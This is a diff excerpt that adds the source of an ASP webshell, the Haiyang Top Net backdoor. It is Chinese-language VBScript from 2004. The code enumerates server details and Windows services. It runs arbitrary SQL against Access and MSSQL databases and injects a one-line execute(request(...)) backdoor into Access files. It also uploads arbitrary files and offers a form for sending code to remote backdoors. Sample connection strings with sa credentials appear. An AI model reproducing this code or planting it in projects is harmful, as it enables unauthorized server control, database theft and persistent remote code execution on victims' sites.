+Response.Write "&lt;tr class=""td"" height=18 onmouseover=""this.className='';"" onMouseOut=""this.className='td'"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=left>&amp;nbsp;服务器IP&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"">&amp;nbsp;" &amp; request.serverVariables("LOCAL_ADDR") &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr class=""td"" height=18 onmouseover=""this.className='';"" onMouseOut=""this.className='td'"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=left>&amp;nbsp;服务器时间&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"">&amp;nbsp;" &amp; now &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr class=""td"" height=18 onmouseover=""this.className='';"" onMouseOut=""this.className='td'"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=left>&amp;nbsp;本文件绝对路径&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"">&amp;nbsp;" &amp; server.mappath(request.serverVariables("SCRIPT_NAME")) &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr class=""td"" height=18 onmouseover=""this.className='';"" onMouseOut=""this.className='td'"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=left>&amp;nbsp;服务器操作系统&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"">&amp;nbsp;" &amp; request.serverVariables("OS") &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr class=""td"" height=18 onmouseover=""this.className='';"" onMouseOut=""this.className='td'"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=left>&amp;nbsp;服务器运算速度测试&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" class=""warningColor"">&amp;nbsp;" &amp; theTime &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr class=""td"" height=18 onmouseover=""this.className='';"" onMouseOut=""this.className='td'"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=left>&amp;nbsp;服务器系统服务列表&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"">&amp;nbsp;" &amp; theStr &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+	if  theAct="showService" then
+		on error resume next
+		for each obj in getObject("WinNT://.")
+			err.clear
+			echo "&lt;tr class=""td"">"
+			echo "&lt;td  height=""22"">&amp;nbsp;"
+			echo obj.Name
+			echo "&lt;/td>&lt;td class=""td"">&amp;nbsp;"
+			echo obj.DisplayName
+			if err then
+				echo "系统用户(组)"
+			end if
+			echo "&lt;/td>&lt;/tr>"
+			echo "&lt;tr class=""td"">&lt;td height=""22"">&lt;/td>&lt;td>&amp;nbsp;&lt;font color=#FF0000>"&amp;obj.path&amp;"&lt;/font>&lt;/td>&lt;/tr>"
+		next 
+	end if
+Response.Write "&lt;tr class=""td"" onmouseover=""this.className='';"" onMouseOut=""this.className='td'"">" &amp; vbNewLine
+Response.Write "&lt;td colspan=""2"" align=left class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr align=""right"" class=""td"" height=18>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""2"">Powered By Allen &amp;amp; LCX 2004.11&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+		showExecuteTime()
+	end sub
+	sub pageSql()
+		isIn(2)
+		dim theAct,sqlStr
+		theAct=request("theAct")
+		sqlStr=request("sqlStr")
+		
+		showTitle("mdb+mssql数据库操作页")
+		
+		if sqlStr="" then
+			if session(m&amp;"sqlStr")="" then
+				sqlStr="e:\hytop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
+			 else
+				sqlStr=session(m&amp;"sqlStr")
+			end if
+		end if
+		session(m&amp;"sqlStr")=sqlStr
+Response.Write "&lt;table width=""760"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" action=""?pageName=sql&amp;theAct=showTables"" onsubmit=""this.Submit.disabled=true;"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=""center"" class=""td"">&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=sql"">mdb+mssql数据库操作&lt;/a>&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""50"" align=""center"" class=""td"">" &amp; vbNewLine
+Response.Write "&lt;input name=""sqlStr"" type=""text"" id=""sqlStr"" value=""" &amp; sqlStr &amp; """ size=""60"">" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=""center"" class=""td"">" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit"" value=""提 交"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit2"" value=""插 入"" onclick=""if(confirm('这里是在ACESS数据里插入海阳顶端网ASP后门\n默认密码是" &amp; clientPassword &amp; "\n后门插入后可以使用的前提是\n数据库是asp后缀,并且没有错乱asp代码\n确认操作吗?')){location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=sql&amp;theAct=inject&amp;sqlStr='+this.form.sqlStr.value;this.disabled=true;}"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit3"" value=""提 示"" onClick=""alert('插入只针对ACESS操作,\n要浏览ACESS在表单中的写法是,d:bbs.mdb\nSQL据库写法是,sql:连接字符串,不要忘写sql:')"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" value=""示 例"" onclick=""this.form.sqlStr.value='e:\hytop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';"">" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+		select case theAct
+			case "showTables"
+				showTables()
+			case "query"
+				showQuery()
+			case "inject"
+				accessInject()
+		end select
+	
+		showExecuteTime()
+	end sub
+	
+	sub showTables()
+		dim conn,sqlStr,rsTable,rsColumn,connStr,tablesStr,loopI
+		sqlStr=request("sqlStr")
+		if lcase(left(sqlStr,4))="sql:" then
+			connStr=mid(sqlStr,5)
+		 else
+			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&amp;sqlStr
+		end if
+		set conn=server.createObject("adodb.connection")
+		
+		on error resume next
+		conn.open connStr
+		chkErr err,encodeForUrl(err.description&amp;"\n"&amp;sqlStr,true)
+		
+		set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))
+		do until rsTable.eof
+			tablesStr=tablesStr&amp;"&lt;br>&amp;nbsp;&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=sql&amp;theAct=query&amp;sqlStr="&amp;encodeForUrl(sqlStr,false)&amp;"&amp;theTable="&amp;enCodeForUrl(rsTable("Table_Name"),false)&amp;""">"&amp;rsTable("Table_Name")&amp;"&lt;/a>"
+			rsTable.moveNext
+		loop
+		rsTable.moveFirst
+Response.Write "&lt;br>" &amp; vbNewLine
+Response.Write "&lt;table width=""760"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""2"" align=""center"" class=""td"">&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=sql&amp;theAct=showTables&amp;sqlStr=" &amp; encodeForUrl(sqlStr,false) &amp; """>数据库表结构查看&lt;/a>&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""2"" class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td valign=""top"" class=""td"">" &amp; tablesStr &amp; "&lt;br> &lt;br> &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td align=""center"" valign=""top"">&lt;a href=""" &amp; "?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=sql&amp;theAct=query&amp;sqlStr="&amp;encodeForUrl(sqlStr,false)&amp;"" &amp; """>转到SQL命令执行&lt;/a>" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+		do until rsTable.eof
+			set rsColumn=conn.openSchema(4,array(empty,empty,rsTable("Table_Name").value))
+Response.Write "&lt;br>" &amp; vbNewLine
+Response.Write "&lt;table width=""98%"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""6"" class=""tr"">&lt;b>" &amp; rsTable("Table_Name") &amp; "&lt;/b>&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr align=""center"">" &amp; vbNewLine
+Response.Write "&lt;td class=""td"">字段名&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td class=""td"">类型&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td class=""td"">大小&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td class=""td"">精度&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td class=""td"">允许为空&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td class=""td"">默认值&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+			loopI=0
+			do until rsColumn.eof
+				loopI=loopI+1
+				if loopI>sqlMaxLoopI then
+					exit do
+				end if
+		
+Response.Write "&lt;tr align=""center"" onmouseout=""this.className='';"" onmouseover=""this.className='td';"">" &amp; vbNewLine
+Response.Write "&lt;td align=""left"">&amp;nbsp;" &amp; rsColumn("Column_Name") &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td width=""80"">" &amp; getDataType(rsColumn("Data_Type")) &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td width=""70"">" &amp; rsColumn("Character_Maximum_Length") &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td width=""70"">" &amp; rsColumn("Numeric_Precision") &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td width=""70"">" &amp; rsColumn("Is_Nullable") &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td width=""80"">" &amp; rsColumn("Column_Default") &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+				rsColumn.moveNext
+			loop
+		
+Response.Write "&lt;/table>" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+			rsTable.moveNext
+		loop
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr align=""right"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""2"" class=""td"">Powered By LCX 2004.11&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+		conn.close
+		set conn=nothing
+		set rsTable=nothing
+		set rsColumn=nothing
+	end sub
+	
+	sub showQuery()
+		dim i,j,rs,sql,page,conn,sqlStr,connStr,rsTable,tablesStr,theTable
+		sql=request("sql")
+		page=request("page")
+		sqlStr=request("sqlStr")
+		theTable=request("theTable")
+		
+		if not isNumeric(page) or page="" then
+			page=1
+		end if
+		
+		if sql="" and theTable&lt;>"" then
+			sql="select top 10 * from ["&amp;theTable&amp;"]"
+		end if
+		
+		if lcase(left(sqlStr,4))="sql:" then
+			connStr=mid(sqlStr,5)
+		 else
+			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&amp;sqlStr
+		end if
+		set rs=server.createObject("adodb.recordSet")
+		set conn=server.createObject("adodb.connection")
+	
+		on error resume next
+		conn.open connStr
+		chkErr err,"无法打开: "&amp;sqlStr
+		
+		set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))
+		do until rsTable.eof
+			tablesStr=tablesStr&amp;"&lt;br>&amp;nbsp;&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=sql&amp;theAct=query&amp;sqlStr="&amp;encodeForUrl(sqlStr,false)&amp;"&amp;theTable="&amp;encodeForUrl(rsTable("Table_Name"),false)&amp;""">"&amp;rsTable("Table_Name")&amp;"&lt;/a>"
+			rsTable.moveNext
+		loop
+Response.Write "&lt;br>" &amp; vbNewLine
+Response.Write "&lt;table width=""760"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""2"" align=""center"" class=""td"">&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=sql&amp;theAct=query&amp;sqlStr=" &amp; encodeForUrl(sqlStr,false) &amp; "&amp;sql=" &amp; enCodeForUrl(sql,false) &amp; """>SQL命令执行及查看&lt;/a>&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""2"" class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" action=""?pageName=sql&amp;theAct=query&amp;sqlStr=" &amp; encodeForUrl(sqlStr,false) &amp; """>" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td width=""150"" valign=""top"" class=""td"">" &amp; tablesStr &amp; "&lt;br> &lt;br> &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td align=""center"" valign=""top"">&lt;br>" &amp; vbNewLine
+Response.Write "&lt;input name=""sql"" type=""text"" id=""sql"" value=""" &amp; server.htmlEncode(sql) &amp; """ size=""60"">" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit4"" value=""执行查询""> &lt;br>" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+		if sql&lt;>"" and left(lcase(sql),7)="select " then
+			rs.open sql,conn,1,1
+			chkErr err,encodeForUrl("错误信息: "&amp;err.description,true)
+			rs.pageSize=20
+			if not rs.eof then
+				rs.absolutePage=page
+			end if
+			if rs.fields.count>0 then
+				echo "&lt;br>&lt;table border=""1"" align=""center"" cellpadding=""0"" cellspacing=""0"" width=""98%"">"
+				echo "&lt;tr>"
+				echo "&lt;td height=""22"" align=""center"" class=""tr"" colspan="""&amp;rs.fields.count&amp;""">SQL操作 - 执行结果&lt;/td>"
+				echo "&lt;/tr>"
+				echo "&lt;tr>"
+				for j=0 to rs.fields.count-1
+					echo "&lt;td height=""22"" align=""center"" class=""td""> "&amp;rs.fields(j).name&amp;" &lt;/td>"
+				next
+				for i=1 to 20
+					if rs.eof then
+						exit for
+					end if
+					echo "&lt;/tr>"
+					echo "&lt;tr onmouseover=""javascript:this.className='td';"" onmouseout=""javascript:this.className='';"" valign=top>"
+					for j=0 to rs.fields.count-1
+						echo "&lt;td height=""22"" align=""center"">"&amp;server.htmlEncode(fixNull(rs(j)))&amp;"&lt;/td>"
+					next
+					echo "&lt;/tr>"
+					rs.movenext
+				next
+			end if
+			echo "&lt;tr>"
+			echo "&lt;td height=""22"" align=""center"" class=""td"" colspan="""&amp;rs.fields.count&amp;""">"
+			for i=1 to rs.pagecount
+				echo replace("&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=sql&amp;theAct=query&amp;sqlStr="&amp;encodeForUrl(sqlStr,false)&amp;"&amp;sql="&amp;sql&amp;"&amp;page="&amp;i&amp;""">&lt;font {$font"&amp;i&amp;"}>"&amp;i&amp;"&lt;/font>&lt;/a> ","{$font"&amp;page&amp;"}","class=warningColor")
+			next
+			echo "&lt;/td>&lt;/tr>&lt;/table>&lt;br>"
+			rs.close
+		 else
+		 	if sql&lt;>"" then
+				on error resume next
+				conn.execute(sql)
+				chkErr err,encodeForUrl(err.description&amp;sql,true)
+				echo "&lt;center>&lt;br>执行完毕!&lt;/center>"
+			end if
+		end if
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr align=""right"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""2"" class=""td"">Powered By LCX 2004.11&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+Response.Write "&lt;br>" &amp; vbNewLine
+		
+		conn.close
+		set rs=nothing
+		set conn=nothing
+		set rsTable=nothing
+	end sub
+	
+	function getDataType(typeId)
+		select case typeId
+			case 130
+				getDataType="文本"
+			case 2
+				getDataType="整型"
+			case 3
+				getDataType="长整型"
+			case 7
+				getDataType="日期/时间"
+			case 5
+				getDataType="双精度型"
+			case 11
+				getDataType="是/否"
+			case 128
+				getDataType="OLE 对象"
+			case else
+				getDataType=typeId
+		end select
+	end function
+	
+	sub accessInject()
+		dim rs,conn,sqlStr,connStr
+		sqlStr=request("sqlStr")
+		if lcase(left(sqlStr,4))="sql:" then
+			onErr("插入只对ACCESS数据库有效!")
+		 else
+			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&amp;sqlStr
+		end if
+		set rs=server.createObject("adodb.recordSet")
+		set conn=server.createObject("adodb.connection")
+		on error resume next
+		conn.open connStr
+		chkErr err,"无法打开: "&amp;sqlStr
+		if notdownloadsExists=true then
+			conn.execute("drop table notdownloads")
+		end if
+		conn.execute("create table notdownloads(notdownloads oleobject)")
+		rs.open "notdownloads",conn,1,3
+		rs.addnew
+		rs("notdownloads").appendchunk(chrB(asc("&lt;"))&amp;chrB(asc("%"))&amp;chrB(asc("e"))&amp;chrB(asc("x"))&amp;chrB(asc("e"))&amp;chrB(asc("c"))&amp;chrB(asc("u"))&amp;chrB(asc("t"))&amp;chrB(asc("e"))&amp;chrB(asc("("))&amp;chrB(asc("r"))&amp;chrB(asc("e"))&amp;chrB(asc("q"))&amp;chrB(asc("u"))&amp;chrB(asc("e"))&amp;chrB(asc("s"))&amp;chrB(asc("t"))&amp;chrB(asc("("))&amp;chrB(asc(""""))&amp;chrB(asc(clientPassword))&amp;chrB(asc(""""))&amp;chrB(asc(")"))&amp;chrB(asc(")"))&amp;chrB(asc("%"))&amp;chrB(asc(">"))&amp;chrB(asc(" ")))
+	    rs.update
+    	rs.close
+		
+		echo "&lt;script language=""javascript"">alert('插入成功!');history.back();&lt;/script>"
+		
+		conn.close
+		set rs=nothing
+		set conn=nothing
+	end sub
+	sub pageUpload()
+		isIn(2)
+		dim theAct,thePath,fileName
+		theAct=request("theAct")
+		thePath=request("thePath")
+		fileName=request("fileName")
+		
+		showTitle("其它操作页面")
+		
+		if thePath="" then
+			thePath=server.mapPath(".")
+		end if
+		if theAct="upload" then
+			streamUpload thePath,fileName
+			echo "&lt;script language=""javascript"">location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=upload';&lt;/script>"
+		end if
+Response.Write "&lt;table width=""760"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" enctype=""multipart/form-data"" action=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=upload&amp;theAct=upload&amp;thePath=" &amp; encodeForUrl(thePath,false) &amp; """ onsubmit=""return upload_canSubmit(this);"">" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" class=""td"">&amp;nbsp;" &amp; request.serverVariables("server_name") &amp; " - Adodb.Stream File Upload&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""50"" align=""center"" class=""td"">" &amp; vbNewLine
+Response.Write "&lt;input name=""file"" type=""file"" size=""30"">" &amp; vbNewLine
+Response.Write "保存为" &amp; vbNewLine
+Response.Write "&lt;input name=""fileName"" type=""text"" value=""" &amp; thePath &amp; """ size=""40"">" &amp; vbNewLine
+Response.Write "&lt;input name=""Submit"" type=""submit"" id=""Submit"" value=""上 传"" onClick=""this.form.action+='&amp;theFile='+this.form.file.value+'&amp;overWrite='+this.form.writeMode.checked;"">" &amp; vbNewLine
+Response.Write "&lt;input type=""checkbox"" name=""writeMode"" value=""True"">覆盖模式" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=""right"" class=""td"">Powered By &lt;a href=""javascript:;"" title=""QQ:26696782"">Marcos&lt;/a> 2004.11&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+Response.Write "&lt;br>" &amp; vbNewLine
+Response.Write "&lt;table width=""760"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" class=""td"">&amp;nbsp;" &amp; request.serverVariables("server_name") &amp; "" &amp; vbNewLine
+Response.Write "- 数制转换&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""50"" align=""center"" class=""td"">" &amp; vbNewLine
+Response.Write "&lt;input type=text name=text1 value=字符和数字转10和16进制 size=25 id=text9>" &amp; vbNewLine
+Response.Write "&lt;input name=""按钮"" type=button onclick=""main();"" value=""给我转""> &lt;input type=""text"" name=""vars"" value=16进制转10进制和字符 size=25 id=vars2>" &amp; vbNewLine
+Response.Write "&lt;input name=""按钮2"" type=button onClick=""main2();"" value=""给我转""> &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=""right"" class=""td"">Powered By LCX 2004.11&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+Response.Write "&lt;script language=vbs>" &amp; vbNewLine
+Response.Write "sub main()" &amp; vbNewLine
+Response.Write "base=document.all.text9.value" &amp; vbNewLine
+Response.Write "If IsNumeric(base) Then" &amp; vbNewLine
+Response.Write "cc=hex(cstr(base))" &amp; vbNewLine
+Response.Write "alert(""10进制为""&amp;base)" &amp; vbNewLine
+Response.Write "alert(""16进制为""&amp;cc)" &amp; vbNewLine
+Response.Write "exit sub" &amp; vbNewLine
+Response.Write "end if" &amp; vbNewLine
+Response.Write "aa=asc(cstr(base))" &amp; vbNewLine
+Response.Write "bb=hex(aa)" &amp; vbNewLine
+Response.Write "alert(""10进制为""&amp;aa)" &amp; vbNewLine
+Response.Write "alert(""16进制为""&amp;bb)" &amp; vbNewLine
+Response.Write "end sub" &amp; vbNewLine
+Response.Write "sub main2()" &amp; vbNewLine
+Response.Write "If document.all.vars.value&lt;>"""" Then" &amp; vbNewLine
+Response.Write "Dim nums,tmp,tmpstr,i" &amp; vbNewLine
+Response.Write "nums=document.all.vars.value" &amp; vbNewLine
+Response.Write "nums_len=Len(nums)" &amp; vbNewLine
+Response.Write "For i=1 To nums_len" &amp; vbNewLine
+Response.Write "tmp=Mid(nums,i,1)" &amp; vbNewLine
+Response.Write "If IsNumeric(tmp) Then" &amp; vbNewLine
+Response.Write "tmp=tmp * 16 * (16^(nums_len-i-1))" &amp; vbNewLine
+Response.Write "Else" &amp; vbNewLine
+Response.Write "If ASC(UCase(tmp))&lt;65 Or ASC(UCase(tmp))>70 Then" &amp; vbNewLine
+Response.Write "alert(""你输入的数值中有非法字符，16进制数只包括1～9及a～f之间的字符，请重新输入。"")" &amp; vbNewLine
+Response.Write "exit sub" &amp; vbNewLine
+Response.Write "End If" &amp; vbNewLine
+Response.Write "tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))" &amp; vbNewLine
+Response.Write "End If" &amp; vbNewLine
+Response.Write "tmpstr=tmpstr+tmp" &amp; vbNewLine
+Response.Write "Next" &amp; vbNewLine
+Response.Write "alert(""转换的10进制为:""&amp;tmpstr&amp;""其字符值为:""&amp;chr(tmpstr))" &amp; vbNewLine
+Response.Write "End If" &amp; vbNewLine
+Response.Write "end sub" &amp; vbNewLine
+Response.Write "&lt;/script>" &amp; vbNewLine
+Response.Write "&lt;br>" &amp; vbNewLine
+Response.Write "&lt;table width=""760"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" target=""_blank"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" class=""td"">&amp;nbsp;" &amp; request.serverVariables("server_name") &amp; "" &amp; vbNewLine
+Response.Write "- 海阳顶端网ASP后门执行 &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""18"" align=""center"" class=""td"">&amp;nbsp;表单提交地址:" &amp; vbNewLine
+Response.Write "&lt;input name=""theAction"" type=""text"" id=""theAction"" value=""http://"" size=""50"">" &amp; vbNewLine
+Response.Write "密码:" &amp; vbNewLine
+Response.Write "&lt;input name=""password"" type=""password"" id=""password"" size=""5"">" &amp; vbNewLine
+Response.Write "&lt;input name=""Submit422"" type=""button"" class=""inputLogin"" onClick=""this.form.sharp.rows+=6;"" value=""+"">" &amp; vbNewLine
+Response.Write "&lt;input name=""Submit42"" type=""button"" class=""inputLogin"" onClick=""if(this.form.sharp.rows&amp;gt;10){this.form.sharp.rows-=6;}"" value=""-"">" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td align=""center"" class=""td""> &lt;textarea name=""" &amp; clientPassword &amp; """ id=""sharp"" cols=""80"" rows=""10"">echo ""www.haiyangtop.net""" &amp; vbNewLine
+Response.Write "fsoSaveToFile ""物理路径\文件名"",request(""fileContent"")" &amp; vbNewLine
+Response.Write "sub fsoSaveToFile(thePath,fileContent)" &amp; vbNewLine
+Response.Write "dim fso,theFile" &amp; vbNewLine
+Response.Write "set fso=server.createObject(""scripting.fileSystemObject"")" &amp; vbNewLine
+Response.Write "set theFile=fso.openTextFile(thePath,2,true)" &amp; vbNewLine
+Response.Write "theFile.write fileContent" &amp; vbNewLine
+Response.Write "theFile.close" &amp; vbNewLine
+Response.Write "echo ""文件保存成功!""" &amp; vbNewLine
+Response.Write "set fso=nothing" &amp; vbNewLine
+Response.Write "set theFile=nothing" &amp; vbNewLine
